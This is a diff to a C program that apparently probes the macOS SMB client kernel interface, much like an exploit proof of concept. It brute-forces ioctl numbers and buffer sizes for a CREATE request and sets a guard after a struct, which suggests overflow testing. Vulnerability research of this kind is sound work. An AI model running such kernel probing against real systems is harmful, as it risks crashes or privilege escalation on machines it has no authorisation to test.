@@ -280,7 +280,8 @@ int main(int argc, char **argv) {
     printf("[*] TCON matched size=%ld\n", tsz);
     if (tsz < 0) { printf("[-] no TCON size dispatched\n"); return 1; }
 
-    /* 4. CREATE */
+    /* 4. CREATE - the smb2 ioctl number may differ on this macOS build, so
+     * brute-force the number (105..130) x size (256..8191). */
     memset(bufD, 0, sizeof(bufD));
     cr->ioc_version = SMB_IOC_STRUCT_VERSION;
     cr->ioc_name = (char *)name;
@@ -290,9 +291,15 @@ int main(int argc, char **argv) {
     cr->ioc_file_attributes = 0x80;
     cr->ioc_share_access = 1 | 2 | 4;
     cr->ioc_disposition = 1;
-    long csz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 120, bufD, 256, 8191);
-    printf("[*] CREATE matched size=%ld ntstatus=0x%x\n", csz, cr->ioc_ret_ntstatus);
-    if (csz < 0) { printf("[-] no CREATE size dispatched\n"); return 1; }
+    long csz = -1, cnum = -1;
+    for (unsigned int num = 105; num <= 130 && csz < 0; num++) {
+        csz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | num, bufD, 256, 8191);
+        if (csz >= 0)
+            cnum = num;
+    }
+    printf("[*] CREATE matched num=%ld size=%ld ntstatus=0x%x\n",
+           cnum, csz, cr->ioc_ret_ntstatus);
+    if (csz < 0) { printf("[-] no CREATE ioctl dispatched\n"); return 1; }
 
     /* 5. VC_PROPERTIES with a guard right after the struct in the buffer */
     memset(bufE, 0, sizeof(bufE));
